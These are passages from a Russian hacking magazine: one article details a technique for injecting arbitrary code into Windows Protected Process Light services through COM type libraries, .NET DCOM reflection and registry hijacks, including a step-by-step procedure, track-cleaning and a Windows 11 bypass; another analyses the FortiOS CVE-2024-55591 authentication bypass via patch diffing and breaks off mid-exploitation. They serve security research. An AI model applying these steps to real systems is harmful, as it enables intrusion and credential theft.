  PS> $parsed.ReferencedTypeLibs
  Name   Version TypeLibId
  ----   ------- ---------
  stdole 2.0     00020430-0000-0000-c000-000000000046
  PS> $parsed.ReferencedTypeLibs[0].Parse().Classes | Select Name, Uuid
  Name       Uuid
  ----       ----
  StdFont    0be35203-8f91-11ce-9de3-00aa004bb851
  StdPicture 0be35204-8f91-11ce-9de3-00aa004bb851
  PS> $cls = Get-ComClass -Clsid 0be35203-8f91-11ce-9de3-00aa004bb851
  PS> $cls.Servers
             Key Value
             --- -----
  InProcServer32 C:\Windows\System32\oleaut32.dll


В этом примере мы используем свойство ReferencedTypeLibs, чтобы пос‐
мотреть, какие библиотеки подтягиваются автоматически при разборе type
library. В нашем случае видим единственную запись — stdole, которая почти
всегда импортируется.
  Но если повезет, можно  найти и  другие  подключенные  библиотеки,
которые стоит исследовать. Давай разберем stdole и посмотрим, какие
классы она экспортирует. Выясняется, что там всего два класса и один
из них — StdFont.
   Если посмотреть, где этот класс может быть создан, то окажется, что он
зарегистрирован  только  для работы  в  локальном  процессе.  Отлично!
Это наша цель для поиска уязвимостей.
   Теперь, чтобы получить удаленный интерфейс к stdole, нам нужен тип,
который на нее  ссылается. Причина  проста: базовые интерфейсы типа
IUnknown и IDispatch определены именно в этой библиотеке, а значит, нуж‐
но найти объект, который их использует.
   Погнали, попробуем создать объект StdFont прямо в удаленном COM-
сервисе!



  PS> $iid = $parsed.Interfaces[0].Uuid
  PS> $ti = $lib.GetTypeInfoOfGuid($iid)
  PS> $href = $ti.GetRefTypeOfImplType(0)
  PS> $base = $ti.GetRefTypeInfo($href)
  PS> $stdole = $base.GetContainingTypeLib()
  PS> $stdole.Parse()
  Name   Version TypeLibId
  ----   ------- ---------
  stdole 2.0     00020430-0000-0000-c000-000000000046
  PS> $ti = $stdole.GetTypeInfoOfGuid("0be35203-8f91-11ce-9de3-
  00aa004bb851")
  PS> $font = $ti.CreateInstance()
  PS> Get-ComObjRef $font | Select ProcessId, ProcessName
  ProcessId ProcessName
  --------- -----------
      27020 svchost.exe
  PS>  Get-ComInterface -Object $Obj
  Name                 IID                                  HasProxy
  HasTypeLib
  ----                 ---                                  --------   ---
  -------
  ...
  IFont                bef6e002-a874-101a-8bba-00aa00300cab True
  False
  IFontDisp            bef6e003-a874-101a-8bba-00aa00300cab True
  True


Чтобы добраться до нужной библиотеки, мы используем хитрую комбинацию
методов: GetRefTypeOfImplType и GetRefTypeInfo. Они позволяют вытащить
базовый   тип   у   существующего   интерфейса.  Затем  с  помощью
GetContainingTypeLib  получаем  интерфейс  подключенной  библиотеки
типов.
   Разбираем ее и убеждаемся, что это действительно stdole. Все идет
по  плану. Теперь  достаем  type  info для  класса StdFont и  вызываем
CreateInstance.
   Дальше самое важное: проверяем, где же создался объект. И бинго! Он
заперт внутри процесса сервиса. В качестве финальной проверки зап‐
рашиваем его интерфейсы — и точно, это объект шрифта. Осталось понять,
как заставить его делать что‑нибудь интересное.
  Нам нужно найти способ эксплуатировать один из этих классов. Но есть
проблема: доступным остается только StdFont. Второй класс, StdPicture,
имеет встроенную проверку, которая блокирует его использование вне про‐
цесса.
  Я не нашел явных уязвимостей в StdFont, но, честно говоря, не копал
слишком глубоко. Так что если у кого‑то чешутся руки — дерзайте! Вполне
возможно, там прячется какой‑нибудь баг, который можно использовать
для повышения привилегий или удаленного выполнения кода.
   Исследование системы сервисов зашло в тупик — по крайней мере, в пла‐
не атак на системные COM-сервисы. Возможно, есть COM-сервер, дос‐
тупный из песочницы, но беглый анализ AppContainer не дал очевидных
целей.
   Однако, немного поразмыслив, я понял: этот метод все еще может быть
полезен — для внедрения кода в процесс с тем же уровнем привилегий.
   Как? Очень просто: перехватываем COM-регистрацию для StdFont! Дос‐
таточно поменять его CLSID в реестре, используя ключ TreatAs, и указать
на любой другой класс, который можно эксплуатировать. Например, загружа‐
ем движок JScript в целевой процесс и исполняем произвольный скрипт.
   Получается элегантный способ внедрить код в доверенный процесс, даже
если нет прямых уязвимостей.
  Я обычно не публикую техники инъекций — это уже ближе к теме малвари.
Но есть один крайне интересный сценарий, где такой трюк может иметь серь‐
езные последствия для безопасности.
   Что, если с его помощью можно внедриться в Windows Protected Process?
  По иронии только что разобранный нами WaaSRemediationAgent может
оказаться идеальным пропуском в защищенный процесс. Давай разберемся,
как это можно провернуть.



  PS> $cls = Get-ComClass -Clsid 72566e27-1abb-4eb3-b4f0-eb431cb1cb32
  PS> $cls.AppIDEntry.ServiceProtectionLevel
  WindowsLight


Когда мы проверили уровень защиты хостового сервиса, оказалось, что он
работает на уровне PPL-Windows (Protected Process Light — Windows)!
   Это значит, что сервис запущен в защищенном режиме и просто так в него
не влезть. Но если мы сможем как‑то использовать наши находки, то получит‐
ся внедрить код в PPL-процесс, что открывает очень интересные возможнос‐
ти.
   Давай попробуем выжать максимум из этого исследования!


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     COM В ЛОВУШКЕ
               АТАКУЕМ WINDOWS ЧЕРЕЗ
               ОБЪЕКТЫ TRAPPED COM





ИНЪЕКЦИЯ В ЗАЩИЩЕННЫЙ ПРОЦЕСС

Я уже писал (и рассказывал на конференциях) про инъекции в Windows
Protected Processes. Если хочешь разобраться глубже, советую перечитать
тот пост — там подробно разбираются предыдущие атаки.
  Но вот ключевой момент: в Microsoft не считают PPL жесткой границей
безопасности. Это значит, что такие уязвимости обычно не закрываются
срочными патчами. Вместо этого их могут исправить только в новой версии
Windows, если вообще обратят на них внимание. А это открывает интересные
возможности для атак.
  Идея до безобразия проста: мы подменяем регистрацию класса StdFont,
чтобы он указывал на другой класс. Когда мы создаем его через type library,
объект будет исполняться в защищенном процессе (PPL).
   Почему StdFont? Он универсален. Даже если WaaSRemediationAgent
исчезнет в будущих обновлениях, этот метод все равно будет работать с дру‐
гим COM-сервером.
   Осталось только найти подходящий класс, который позволит нам запус‐
тить произвольный код и не сломается внутри PPL. Если такой найдется, тог‐
да это уже не просто уязвимость, а шикарный механизм обхода защиты
Windows.
  К сожалению, скриптовые движки типа  JScript  сразу отпадают. Если
перечитать мой предыдущий пост, узнаешь, что Code Integrity блокирует их
загрузку в Protected Process. Так что этот путь закрыт.
   Значит, нужен класс, который, во‑первых, доступен вне процесса, во‑вто‐
рых, разрешен для загрузки в защищенный процесс.
   Тут у меня появилась идея: .NET DCOM!
  Я уже писал, что .NET-компоненты в DCOM — это дырявая конструкция,
которой не стоит пользоваться. Но в этом случае нам как раз нужна вся эта
кривизна! Если мы сможем загрузить класс .NET COM внутрь PPL, то получим
мощный вектор для выполнения произвольного кода.
   Дальше — ищем нужный класс .NET COM и запускаем веселье.
  Я уже как‑то рассказывал про атаки через сериализацию в .NET, но ока‐
залось, что есть вариант гораздо проще и мощнее.
   Фишка в том, что через DCOM можно создать объект System.Type. А имея
доступ к объекту Type, можно делать произвольные рефлексивные вызовы —
вызываем любые методы, загружаем любые классы.
  А знаешь, какой самый жирный трюк? Загрузка сборки прямо из массива
байтов! Это обходит проверку цифровой подписи и позволяет загружать
любой код в защищенный процесс (PPL).
   Итог: полный контроль над защищенным процессом без  эксплоитов
в самом PPL. Просто хакерская магия с DCOM и .NET.
   Да, в Microsoft закрыли эту дыру, но оставили бэкдор — параметр
AllowDCOMReflection. Если его включить, старая уязвимость возвращается,
как ни в чем не бывало.
   Поскольку мы не повышаем привилегии, а уже работаем с админскими
правами  (иначе  нельзя изменить регистрацию COM-класса), то просто
записываем в реестр


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\
AllowDCOMReflection = 1 (DWORD)

И загружаем .NET Framework внутрь защищенного процесса (PPL).
   Чтобы успешно внедрить код в защищенный процесс, делаем следующее:
 1. Включаем DCOM Reflection в реестре.
 2. Подменяем COM-регистрацию StdFont, добавляя ключ TreatAs, чтобы
   он указывал на System.Object.
 3. Создаем объект WaaSRemediationAgent , чтобы работать через его type
    library.
 4. Получаем TypeInfo для класса StdFont через type library.
 5. Создаем объект StdFont через CreateInstance, но реально это заг‐
   рузит .NET Framework и вернет нам экземпляр System.Object.
 6. Используем        .NET          Reflection        для        вызова
   System.Reflection.Assembly::Load(byte[]), чтобы загрузить кастомную сбор‐
   ку без проверки подписи.
 7. Создаем объект из загруженной сборки, чтобы сразу запустить про‐
   извольный код в защищенном процессе (PPL).
 8. Чистим реестр, убираем изменения, чтобы замести следы.

Итог: мы получили полный контроль над защищенным процессом Windows,
используя хитрую комбинацию DCOM, .NET Reflection и COM-редиректа.
   Важно написать этот эксплоит не на .NET-языке, иначе механизмы сери‐
ализации пересоздадут reflection-объекты в вызывающем процессе и инъ‐
екция не сработает. Оптимальный вариант — C++, но можно попробовать
Python с pywin32 или ctypes. В своем PoC я использовал C++, и он схож с экс‐
плоитом, который я писал для CVE-2014-0257, где подробно показано,
как использовать DCOM Reflection.
  Еще один нюанс — по умолчанию объекты .NET COM запускаются через
.NET Framework v2, который больше не устанавливается в новых версиях
Windows. Можно либо настроить запуск через .NET v4, что сложнее, либо
просто установить v2 через Windows Components Installer, как сделал я. В ито‐
ге получаем C++ PoC, который позволяет выполнить произвольный код
в защищенном  процессе Windows, используя комбинацию DCOM, .NET
Reflection и манипуляций с COM-регистрацией.
  Мой PoC сработал с первого раза на Windows 10, но, к сожалению,
на Windows 11 24H2 затея провалилась. Мне удалось создать .NET-объект,
но при вызове любого метода возникала ошибка TYPE_E_CANTLOADLIBRARY.
   Можно было бы на этом остановиться, ведь сам факт уязвимости уже
доказан, но мне стало интересно, что именно ломается на Windows 11. Давай
разберемся, почему это происходит, и посмотрим, можно ли что‑то сделать,
чтобы обойти это ограничение и заставить PoC работать на последней вер‐
сии Windows.


ПРОБЛЕМА С WINDOWS 11

Я смог доказать, что ошибка связана именно с защищенными процессами
(PPL). Если изменить настройки сервиса и запустить его без защиты, PoC
снова начинает работать. Значит, что‑то конкретно блокирует загрузку биб‐
лиотек в защищенном режиме.
  При этом type libraries в целом загружаются нормально, например stdole
работает без проблем. Значит, ограничение касается именно .NET, а не всех
COM-библиотек. Теперь  нужно  разобраться, что именно программисты
Microsoft поменяли в обработке .NET внутри PPL на Windows 11.
   Анализ работы PoC с Process Monitor показал, что во время выполнения
загружается библиотека mscorlib.tlb. Она используется для создания stub-
класса на сервере. Однако по какой‑то причине загрузка не срабатывает,
из‑за чего stub не создается, а это, в свою очередь, ломает любые вызовы
к объекту.
   Тут у меня появилась догадка. В одном из прошлых постов я рассказывал,
как атаковать процесс NGEN COM: модификация type  library приводила
к type-confusion, что позволяло перезаписать хендл KnownDlls и подгрузить
произвольную DLL в память.
  Но в Microsoft в последние годы серьезно занялись защитой KnownDlls —
об этом писал Клемент Лабро и другие исследователи. Я заподозрил, что
Windows 11 получила еще одно исправление, блокирующее атаку через под‐
мену type library.
   Теперь надо выяснить, как именно это ограничение работает и можно ли
его обойти.
   Погрузившись в oleaut32.dll, я нашел фикс, который нам мешает.
Это метод VerifyTrust. Вот как он выглядит:


NTSTATUS VerifyTrust(LoadInfo *load_info) {
  PS_PROTECTION protection;
  BOOL is_protected;


  CheckProtectedProcessForHardening(&is_protected, &protection);
  if (!is_protected)
    return SUCCESS;
  ULONG flags;
  BYTE level;
  HANDLE handle = load_info->Handle;
  NTSTATUS status = NtGetCachedSigningLevel(handle, &flags, &level,
                                            NULL, NULL, NULL);
  if (FAILED(status) ||
     (flags & 0x182) == 0 ||
     FAILED(NtCompareSigningLevels(level, 12))) {
    status = NtSetCachedSigningLevel(0x804, 12, &handle, 1, handle);
  }
  return status;
}

Этот метод вызывается во время загрузки type library и проверяет уровень
подписи файла (signing level). Это снова связано с механизмом кеширован‐
ного уровня подписи.
   Если у файла нет уровня подписи 12 (Windows Signing Level), код пытается
принудительно установить его через NtSetCachedSigningLevel. Если это не
удается, система считает, что файл нельзя загрузить в защищенный процесс,
и выдает ошибку. В итоге type library не загружается и PoC ломается.
   Кстати, похожий фикс блокирует атаку через Running Object Table, где
можно было ссылаться на out-of-process type library. Но в данном случае нас
интересует именно защита PPL. Теперь вопрос: можно ли как‑то обойти про‐
верку подписи и заставить Windows загрузить нужную библиотеку?
   Судя по выводу Get-AuthenticodeSignature, файл mscorlib.tlb дей‐
ствительно подписан, хоть и каталожной подписью. Сертификат — Microsoft
Windows Production PCA 2011, тот же самый, что и у .NET Runtime DLL. Логич‐
но, что у него должен быть Windows Signing Level, так что что‑то тут не сходит‐
ся.
   Попробуем   обойти   систему!   Достанем   мой   NtObjectManager
для PowerShell и вручную установим кешированный уровень подписи. Может,
это даст какие‑то подсказки, что именно идет не так. Если получится под‐
делать подпись — дорога к инъекции снова открыта.



  PS> $path = "C:\windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.
  tlb"
  PS> Set-NtCachedSigningLevel $path -Flags 0x804 -SigningLevel 12 -
  Win32Path
  Exception calling "SetCachedSigningLevel" with "4" argument(s): "(
  0xC000007B) - {Bad Image}
  %hs is either not designed to run on Windows or it contains an error.
  Try installing the program again using the
  original installation media or contact your system administrator or the
  software vendor for support. Error status 0x"
  PS> Format-HexDump $path -Length 64 -ShowAll
  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
  ------------------------------------------------------------------------
  -----
  00000000: 4D 53 46 54 02 00 01 00 00 00 00 00 09 04 00 00  -
  MSFT............
  00000010: 00 00 00 00 43 00 00 00 02 00 04 00 00 00 00 00  - ....
  C...........
  00000020: 25 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00  -
  %...............
  00000030: 2E 0D 00 00 33 FA 00 00 F8 08 01 00 FF FF FF FF  - ....
  3...........


Попытка  вручную  установить  уровень  подписи  обломилась с  ошибкой
STATUS_INVALID_IMAGE_FORMAT. Заглядываем в первые 64 байта mscorlib.
tlb и обнаруживаем, что это сырая type library, а не PE-файл. А вот это уже
проблема.
   Обычно, даже если файл имеет расширение .TLB, он все равно запакован
в PE как ресурс. Но тут, похоже, не тот случай. Windows, судя по всему, просто
не умеет устанавливать кешированный уровень подписи файлам, которые
не являются PE-образами.
   Короче говоря, если мы не сможем заставить Windows поверить, что этот
файл подписан, то он не загрузится в защищенный процесс. А без него мы
не сможем создать stub-класс и вызвать .NET-интерфейсы через DCOM.
  Не повезло! Но всегда есть обходные пути. Вопрос только в том, какой
из них сработает.


Забавный момент: у меня есть виртуалка с Windows 11, где та же самая type
library в не DLL-формате все же принимает кешированный уровень подписи.
То есть в одном окружении Windows блокирует загрузку, а в другом — спокой‐
но ее пропускает.
   Очевидно, я каким‑то образом изменил конфигурацию этой VM, что поз‐
волило системе принимать подпись даже для raw type library. Но вот что имен‐
но я поменял — понятия не имею.
   Рыться дальше мне, если  честно, уже лень. Просто фиксирую факт:
если бы удалось повторить эту магию на боевой системе, то защита снова бы
сломалась.



Можно было бы попытаться найти старую версию type library, которая и под‐
писана правильно, и запакована в PE, но ковыряться в архивах не хочется.
   Конечно, наверняка есть и другой COM-объект, который можно загрузить
вместо .NET и получить удаленное выполнение кода. Но мне принципиально
хотелось добить именно этот способ.
  В итоге решение оказалось проще, чем я думал. По какой‑то причине 32-
битная версия type library (которая лежит в Framework, а не Framework64) упа‐
кована в DLL. А раз так, на нее можно установить кешированный уровень под‐
писи — и вуаля, защита больше не мешает!



  PS> $path = "C:\windows\Microsoft.NET\Framework\v4.0.30319\mscorlib.tlb"
  PS> Format-HexDump $path -Length 64 -ShowAll
  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
  ------------------------------------------------------------------------
  -----
  00000000: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  -
  MZ..............
  00000010: B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  - ........
  @.......
  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  -
  ................
  00000030: 00 00 00 00 00 00 00 00 00 00 00 00 B8 00 00 00  -
  ................
  PS> Set-NtCachedSigningLevel $path -Flags 0x804 -SigningLevel 12 -
  Win32Path
  PS> Get-NtCachedSigningLevel $path -Win32Path
  Flags               : TrustedSignature
  SigningLevel        : Windows
  Thumbprint          :
  B9590CE5B1B3F377EAA6F455574C977919BB785F12A444BEB2...
  ThumbprintBytes     : {185, 89, 12, 229...}
  ThumbprintAlgorithm : Sha256


Значит, чтобы провернуть атаку на Windows 11 24H2, просто меняем путь
в реестре для регистрации type library — вместо 64-битной версии под‐
совываем 32-битную. После этого запускаем эксплоит заново.
   Функция VerifyTrust сама автоматически установит кешированный уро‐
вень подписи, так что никаких дополнительных танцев с бубном реестром
или подписыванием не требуется — все просто работает.
    Хотя формально это другая версия type library, на практике это ничего
не меняет. Генератор stub-классов продолжает работать без проблем, а зна‐
чит, наша атака остается полностью рабочей. Ребята из Microsoft, хотите зак‐
рыть лазейку? Попробуйте еще раз.


ВЫВОДЫ

В этом исследовании я разобрал интересный класс уязвимостей в Windows,
который,  впрочем,  актуален  для  любого  объектно  ориентированного
механизма удаленного взаимодействия между процессами. Мы увидели,
как можно запереть COM-объект в более привилегированном процессе,
используя особенности OLE Automation, в частности интерфейс IDispatch
и библиотеки типов.
   Этот трюк позволяет обходить ограничения, создавая объекты внутри
защищенных процессов и затем управляя ими удаленно. Это не просто
локальный баг, а целый класс атак, который Microsoft закрывает уже не в пер‐
вый раз... но мы снова нашли лазейку.
    Хотя мне не удалось продемонстрировать повышение  привилегий, я
показал,   как  можно   использовать  интерфейс   IDispatch  в   классе
WaaSRemediationAgent, чтобы внедрить код в процесс с уровнем защиты
PPL-Windows. Это, конечно, не максимальный уровень защиты, но дает дос‐
туп к большинству защищенных процессов, включая LSASS.
  Мы увидели, что в Microsoft действительно стараются закрывать воз‐
можности для атак, например через подмену type library, но в нашем случае их
защита не должна была мешать — ведь мы не изменяли саму type library.
   Да, этот конкретный эксплоит требует администраторских привилегий.
Но сама техника в общем случае не зависит от прав администратора. Если
удастся найти подходящий COM-сервер, который экспортирует IDispatch,
можно провести атаку от имени обычного пользователя, просто изменив
локальную регистрацию COM и .NET. Вопрос лишь в том, какие сервисы
еще остались открытыми для этой техники.
ВЗЛОМ





В этой статье я расскажу, как искал недавно
раскрытую компанией Fortinet уязвимость
CVE-2024-55591   в   продуктах   FortiOS
и FortiProxy. Уязвимость позволяет обходить
аутентификацию с использованием альтер‐            YellowDuck
нативного  пути  или  канала  (CWE-288),
а еще дает возможность удаленному зло‐
умышленнику получить привилегии супер‐
пользователя и выполнить произвольные
команды.


14 января компания Fortinet раскрыла подробности критической уязвимости
CVE-2024-55591 (CVSS 9,6) в продуктах FortiOS и FortiProxy. Эта новость сра‐
зу же привлекла мое внимание, потому что FortiOS — основная операционная
система для межсетевых экранов FortiGate, которые повсеместно исполь‐
зуются для защиты корпоративных сетей и организации удаленного доступа.
Появление уязвимости подобного класса предвещало интересный ресерч,
а также возможность попрактиковаться в реверс‑инжиниринге и анализе
исходного кода.
   Как и всегда в подобных ситуациях, между исследователями со всего
мира возникает соревнование за первенство в публикации PoC и подробного
описания процесса эксплуатации уязвимости, и я не смог отказать себе
в возможности поучаствовать в этой гонке умов.


ИДЕНТИФИЦИРУЕМ УЯЗВИМОСТЬ

В анализе уже опубликованных уязвимостей есть огромное преимущество —
как правило, вендор любезно предоставляет общее описание и тем самым
обозначает для нас приблизительный  вектор  эксплуатации,  значительно
сужая область поиска и экономя кучу времени.
   Итак, из бюллетеня безопасности мы знаем следующее:
 • уязвимость позволяет обойти аутентификацию путем отправки специально
   сконструированных запросов в модуль WebSocket Node.js;
 • уязвимость каким‑то образом связана с взаимодействием через jsconsole
   (это CLI, который доступен из интерфейса администрирования прямо
   в браузере);
 • для успешной эксплуатации уязвимости необходимо знать имя действу‐
  ющей учетной записи администратора.


PATCH DIFFING

Вероятно, самый популярный и простой способ найти исправленную уяз‐
вимость — это patch diffing. По своей сути он представляет собой сравнение
двух разных «состояний» ПО — до и после того, как был выпущен патч.
Как правило, для этого применяются различные методы реверс‑инжиниринга,
и даже существуют специальные утилиты, позволяющие автоматизировать
этот процесс (например, BinDiff).
   FortiOS — проприетарное ПО с закрытым исходным кодом, поэтому прос‐
то покопаться в файлах ОС у нас не получится. К счастью, в открытом доступе
полно статей, описывающих методы дешифрования и распаковки прошивок
FortiGate. В моем случае понадобилось лишь незначительно отступить от этих
алгоритмов, чтобы получить полноценный доступ к файловой системе, но эти
операции выходят за рамки сегодняшней статьи.
   Файловая система FortiOS представляет собой стандартную структуру
директорий, характерную для основанных на Unix операционных систем.
Здесь мое внимание сразу же привлекла папка node-scripts, которая нед‐
вусмысленно намекает, что именно здесь расположена логика Node.js.





                     Структура файловой системы FortiOS

Внутри  этой  директории  лежит файл index.js,  в котором  примерно
на 50 тысяч строк описана вся логика модуля Node.js. В FortiOS 7.0.17 раз‐
работчики решили немного усложнить жизнь ресерчерам (или хакерам?)
и удалили комментарии из кода. Теперь он представляет собой только одну
строку без переносов и отступов. Однако в уязвимой версии 7.0.16 ком‐
ментарии все еще имеются, а код можно свободно читать. Поэтому воору‐
жаемся плагином Prettier для VS Code, пропускаем через него код из вер‐
сии 7.0.17 и начинаем поиски.
  Из описания уязвимости мы знаем, что она связана с обходом аутен‐
тификации в модуле WebSocket Node.js, поэтому очевидным будет поискать
изменения где‑то в  окрестности методов  аутентификации и  обработки
WebSocket. Поэтому добавляем index.js из обеих версий в сравнение в VS
Code и визуально изучаем. Здесь в глаза бросается удаленный после патча
параметр   local_access_token,   который   проверяется   в   методе
_getAdminSession класса WebAuth. Разработчики удалили всю логику, свя‐
занную с параметром, который обрабатывается в методе получения сессии
администратора, — уже звучит интересно, не так ли?





                         Функция getAdminSession

Продолжаем наше путешествие по тысячам строк кода и натыкаемся на еще
одну зацепку. В уязвимой версии строка


ws.on("message", (msg) => cli.write(msg));

находилась в основном потоке выполнения класса CliConnection. Теперь же
ее перенесли в отдельный метод setup(). Несложно догадаться, что этот
класс отвечает за взаимодействие пользователя с CLI из интерфейса адми‐
нистратора в браузере (помнишь jsconsole из введения?). Очевидно, этот код
отвечает за отправку сообщений, полученных по WebSocket в этот самый CLI.
Похоже, это именно то, что рассказали нам Fortinet в своем бюллетене
безопасности.
   Теперь мы приблизительное представляем, что именно было изменено
разработчиками Fortinet для исправления этой уязвимости. Осталось понять,
как воспользоваться полученными знаниями, чтобы ее проэксплуатировать.
Для этого нам необходимо разобраться в механизме аутентификации поль‐
зователей.


ИССЛЕДУЕМ МЕХАНИЗМ АУТЕНТИФИКАЦИИ

Веб‑интерфейс FortiGate предоставляет аутентифицированным пользовате‐
лям возможность взаимодействия с CLI прямо из окна браузера. Простым
нажатием   кнопки   администратору   становится  доступен  стандартный
интерфейс терминала для взаимодействия с FortiGate.
   Самый очевидный способ разобраться в механизме аутентификации —
посмотреть на то, как выглядит легитимный процесс. Передаем большое спа‐
сибо Fortinet за любезно предоставленные в свободном доступе виртуальные
машины FortiGate, качаем себе одну и разворачиваем. Затем запускаем Burp
Suite, переходим в веб‑интерфейс и открываем окно CLI. Перед нашим взо‐
ром  предстает обширный  процесс  клиент‑серверного  взаимодействия,
но нам интересно одно — эндпоинт, расположенный по следующему адресу:


https://fortigate.example/ws/cli/open/

Именно сюда обращается браузер пользователя перед тем, как открывается
окно CLI. В запросе передаются полученные при первичной аутентификации
куки, а также параметр Upgrade, указывающий серверу, что дальнейшее
общение с клиентом будет проходить по протоколу WebSocket.





                       Запрос для открытия web CLI

Никакого упоминания параметра local_access_token тут нет, поэтому вер‐
немся к исходному коду модуля Node.js и посмотрим на процесс аутен‐
тификации там.


ИНИЦИАЛИЗАЦИЯ СОЕДИНЕНИЯ WEBSOCKET

Для взаимодействия посредством WebSocket в логике Node.js предусмотрен
класс WebsocketDispatcher, которому передается управление после ини‐
циализации  соединения. Здесь определен метод dispatch(), который
занимается обработкой пользовательских запросов:


this._server.on('connection', (ws, request) => {
    const dispatcher = new WebsocketDispatcher(ws, request);
    dispatcher.dispatch();
});


МЕТОД DISPATCH()

Метод dispatch() отвечает за проверку пользовательской сессии и опре‐
деляет, как обрабатывать WebSocket-запрос:


async dispatch() {
    [...]
    const { session, isCsfAdmin } = await this._getSession();


    if (!session) {
        this.ws.send('Unauthorized');
        this.ws.close();
        return null;
    }
    [...]
    if (this.path.startsWith('/ws/cli/')) {
            return new CliConnection(this.ws, { headers }, this.
searchParams,                this.groupContext);
    }
}

Метод _getSession() получает сессию и проверяет, обладает ли поль‐
зователь необходимыми правами.
   Если сессия недействительна, соединение разрывается. В противном
случае создается экземпляр CliConnection для обработки взаимодействий
с  CLI.  Именно сюда нам  хотелось бы  попасть,  а  для  этого метод
_getSession() должен вернуть True.


ПРОВЕРКА СЕССИИ С ПОМОЩЬЮ _GETSESSION()

Метод _getSession() — ключевой элемент процесса аутентификации:


async _getSession() {
    const isConnectionFromCsf =
      this.request.headers['user-agent'] === CSF_USER_AGENT &&
      this.localIpAddress === '127.0.0.1';


    let isCsfAdmin = false;
    let session;


    if (!isConnectionFromCsf) {
        session = await webAuth.getValidatedSession(this.request, {
          authFor: 'websocket',
          groupContext: this.groupContext,
        });
    [...]
    return { session, isCsfAdmin };
}

Метод  проверяет,  исходит ли  запрос от  локального  подключения CSF
(Security   Fabric —   экосистема   продуктов    Fortinet),   сопоставляя
CSF_USER_AGENT и локальный IP-адрес 127.0.0.1. Если это так, создается
предопределенный объект сессии.
  Для     удаленных     запросов     вызывается    метод    webAuth.
getValidatedSession(), который выполняет валидацию сессии на основе
токенов или куки.


ПРОВЕРКА НА ОСНОВЕ ТОКЕНОВ ИЛИ КУКИ С ПОМОЩЬЮ
GETVALIDATEDSESSION()

Этот метод управляет извлечением токена и поиском уже существующей сес‐
сии. Помнишь наш легитимный сценарий аутентификации? Именно этот
метод проверял, что у нас есть права на доступ к CLI:


async getValidatedSession(request, options = {}) {
    [...]
    const authToken = await this._extractToken(request);
    let session = null;
    [...]
    if (authToken) {
        const sessionEntry = webSession.get(authToken);
        if (sessionEntry) {
            session = sessionEntry.session;
        }
    }
    [...]
    if (!session) {
        session = await this._getAdminSession(request, options);
        [...]
    }
    if (authToken && !(await this._csrfValidation(request))) {
        session = null;
    }
    return session;
}

Метод _extractToken() извлекает токен или API-ключ из запроса.
   Если действительная сессия не найдена в кеше (webSession.get()), про‐
исходит переход к _getAdminSession() для дальнейшей проверки.


ПЕРЕХОД К _GETADMINSESSION()

Если сессия не найдена в кеше, метод _getAdminSession() пытается про‐
верить уже знакомый нам local_access_token, переданный в качестве
параметра в URL:


async _getAdminSession(request, options = {}) {
    [...]
    const query = querystring.parse(request.url.replace(/.*\?/, ''));
    const localToken = query.local_access_token;
    const authParams = ["monitor", "web-ui", "node-auth"];
    let authParamsFound = false;
    [...]
    if (localToken) {
        authParams[authParams.length - 1] += `?local_access_token=${
localToken}`;
        authParamsFound = true;
    }


    if (!authParamsFound) {
        return null;
    }
    return await new ApiFetch(...authParams);
}

Параметр local_access_token извлекается из строки запроса. Если токен
предоставлен, он добавляется к параметру node-auth предопределенного
массива authParams. Затем вызывается метод ApiFetch, который передает
массив    authParams       (["monitor",     "web-ui",     "node-auth?
local_access_token=TOKEN"]) для дальнейшей обработки.
   Здесь мы прервемся на небольшую паузу и немного отдохнем от чтения
кода. Итак, мы остановились на методе _getAdminSession(). Как можно
заметить, на текущий момент бэкенд FortiGate никаким образом не валиди‐
ровал local_access_token, а лишь проверил его существование в запросе.
Звучит странно, не правда ли?
  Мы успешно прошли следующую цепочку аутентификации:


dispatch() → _getSession() → getValidatedSession() → _
getAdminSession()

Можно предположить, что local_access_token будет проверен на стороне
REST API. Но не спеши этого делать.


REST API ЗАПРОС ЧЕРЕЗ APIFETCH()

Класс ApiFetch() отправляет запрос REST API с параметрами, которые пре‐
доставляет _getAdminSession(). Давай рассмотрим все эти параметры
по очереди.
  Для начала массив authParams формирует API-эндпоинт:


https://fortigate.example/api/v2/monitor/web-ui/node-auth?local_
access_token=TOKEN

Затем конструктор в ApiFetch определяет стандартные HTTP-заголовки:


[...]
const defaultHeaders = {
    'user-agent': SYMBOLS.NODE_USER_AGENT, // Предопределенный
User-Agent Node.js
    'accept-encoding': 'gzip, deflate'
};
[...]

После этого функция fetch отправляет запрос на сформированный URL
с использованием стандартных заголовков. Сервер обрабатывает этот зап‐
рос и возвращает информацию о сессии.
   Итак, мы разобрались с происходящим в модуле Node.js. Важно отметить,
что сейчас совершенно ясно: запрос к REST API не содержит никаких
параметров, позволяющих аутентифицировать клиента (например, заголовка
X-Forwarded-For), кроме пресловутого local_access_token.
  С точки зрения внутреннего устройства все выглядит так, как будто сам
Node.js обращается к REST API. Дальнейшая обработка запроса выполняется
на стороне основного приложения FortiOS. Будем держать в голове, что
для успешной аутентификации запрос к REST API должен вернуть объект
валидной сессии, что позволит нам пройти по цепочке аутентификации
в обратную сторону и в итоге вернуться к созданию объекта CliConnection(
).


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ШТУРМУЕМ КРЕПОСТЬ
          ОБХОДИМ АУТЕНТИФИКАЦИЮ
              В FORTIOS И FORTIPROXY





ШОУ НАЧИНАЕТСЯ

Дорогой читатель, я искренне благодарен тебе за то, что ты смог дойти
до этой главы. Понимаю, выше расположен огромный пласт нудной техничес‐
кой информации, но, поверь мне, все это потребуется нам, чтобы понять,
в чем же кроется проблема. Дальше будет интересно, обещаю!
  Мы остановились на моменте передачи запроса к REST API с параметром
local_access_token. Никакой информации в документации к FortiOS о том,
для чего он предназначен, я не нашел. Поэтому пойдем эмпирическим путем
и просто попробуем передать случайное значение.
   Вновь вернемся к Burp Suite, сконструируем запрос по ранее обнаружен‐
ному нами адресу, передав заголовки Connection:  Upgrade и Upgrade:
websocket, и посмотрим на реакцию системы. Отправляем его и видим
